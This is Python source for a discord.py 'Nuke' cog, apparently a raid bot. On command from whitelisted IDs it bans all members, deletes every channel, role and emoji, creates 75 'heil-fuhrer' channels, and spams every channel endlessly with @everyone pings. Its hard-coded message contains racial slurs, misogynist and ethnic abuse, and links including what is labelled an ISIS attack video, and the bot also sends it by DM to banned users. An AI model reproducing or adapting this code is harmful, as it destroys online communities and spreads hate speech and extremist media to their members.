import discord
from discord.ext import commands
from discord.utils import get as discget


class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.message = """**PAKISTAN ZINDABAD**
GET NUKED YOU FUCKING NIGGERS
YOU FELL FOR OUR INSANELY OBVIOUS TRICK
YOUR SERVER IS FULL OF INCELS
THANK US FOR FIXING IT
ENJOY YOUR NUKED SERVER :rofl: :flag_pk: :muscle: 

**BEAT YOUR WOMEN :ok_hand: NO RIGHTS FOR THEM
BUSH DID 9/11,
FUCK YOU GEORGE**
**THE FUCKING FAUJ HAS COME YOU MADARCHOD
INDIA MAURABAD :flag_in: :poop: :flag_il: :poop: 
FREEDOM FOR PALESTINE :flag_ps: :muscle:**
https://i.redd.it/eugj6cyclvc41.jpg
https://cdn.discordapp.com/attachments/693974529923612728/708740792985845800/ISIS_attack_on_shia_iraqi_majoos.webm
https://cdn.discordapp.com/attachments/693974529923612728/708740800921731122/1584351692024.webm
https://cdn.discordapp.com/attachments/693974529923612728/708740726657253476/1583023579139.webm
https://cdn.discordapp.com/attachments/693974529923612728/708740617496428604/1582226028317.webm"""

        self.invites = 'https://discord.gg/Hq753Xz'
                         # Koda               # Lime
        self.whitelist = [653983428785733652, 703244120881234011]
                      # Koda               # Lime              # Abdullah
        self.no_ban = [653983428785733652, 703244120881234011, 693966934437265453]
                       # Nytt Svenska
        self.servers = [700008439295770685]

    async def delete_channels(self, ctx):
        print("Deleted channels ( ", end='', flush=True)
        for channel in ctx.guild.channels:
            if not channel.name == 'no-delete':
                try:
                    await channel.delete()
                    print(f"'{channel.name}', ", end='', flush=True)
                except:
                    pass
        print(')\n')

    async def delete_roles(self, ctx):
        print("Deleted roles ( ", end='', flush=True)
        for role in ctx.guild.roles:
            try:
                await role.delete()
                print(f"'{role.name}', ", end='', flush=True)
            except:
                pass
        print(')\n')

    async def delete_emojis(self, ctx):
        print("Deleted emojis ( ", end='', flush=True)
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                print(f"'{emoji.name}', ", end='', flush=True)
            except:
                pass
        print(')\n')

    async def ban_members(self, ctx):
        print("Banned members ( ", end='', flush=True)
        for member in ctx.guild.members:
            try:
                if not member.id in self.no_ban:
                    await ctx.guild.ban(member, reason="NUKE")
                    print(f"'{member.name}', ", end='', flush=True)
                    await member.send(f"{self.message}\n{self.invites}")
            except:
                pass
        print(')\n')

    async def make_channels(self, ctx):
        await ctx.guild.create_text_channel(f"no-spam")
        for i in range(75):
            try:
                await ctx.guild.create_text_channel(f"heil-fuhrer-{i+1}")
            except:
                print(f"Created ( {i} channels )")

    async def spam_channel(self, ctx):
        while True:
            try:
                await ctx.send(f"{self.message}\n{self.invites}\n@everyone")
            except:
                pass

    async def spam_all_channels(self, ctx):
        for channel in ctx.guild.channels:
            if not channel.name == 'no-spam' or not channel.name == 'no-delete':
                await channel.send(">spam")

    @commands.Cog.listener()
    async def on_message(self, ctx):
        if ctx.author.bot:
            if ctx.content.startswith(">spam"):
                await self.spam_channel(ctx.channel)

    async def warn(self, ctx, t):
        koda = self.bot.get_user(self.whitelist[0])
        await koda.send(f"{ctx.author} attempted to use the {t} command in {ctx.guild.name}.")

    @commands.command()
    async def nuke(self, ctx):
        await ctx.message.delete()
        if ctx.author.id in self.whitelist:
            if not ctx.guild.id in self.servers:
                await self.ban_members(ctx)
                await self.delete_channels(ctx)
                await self.delete_roles(ctx)
                await self.delete_emojis(ctx)
                await self.make_channels(ctx)
                await self.spam_all_channels(ctx)
                print("Done!")
            else:
                await ctx.author.send("You fucking retard, you can't nuke this server.")
        else:
            await self.warn(ctx, 'nuke')
            raise commands.CommandNotFound('shit')

    @commands.command()
    async def destroy(self, ctx):
        await ctx.message.delete()
        if ctx.author.id in self.whitelist:
            if not ctx.guild.id in self.servers:
                await self.delete_channels(ctx)
                await self.delete_roles(ctx)
                await self.delete_emojis(ctx)
                print("Done!")
            else:
                await ctx.author.send("You fucking retard, you can't destroy this server.")
        else:
            await self.warn(ctx, 'destroy')
            raise commands.CommandNotFound('shit')

    @commands.command()
    async def spam(self, ctx):
        await ctx.message.delete()
        if ctx.author.id in self.whitelist:
            if not ctx.guild.id in self.servers:
                await self.spam_all_channels(ctx)
                print("Done!")
            else:
                await ctx.author.send("You fucking retard, you can't spam this server.")
        else:
            self.warn(ctx, 'spam')
            raise commands.CommandNotFound('shit')


def setup(bot):
    bot.add_cog(Nuke(bot))
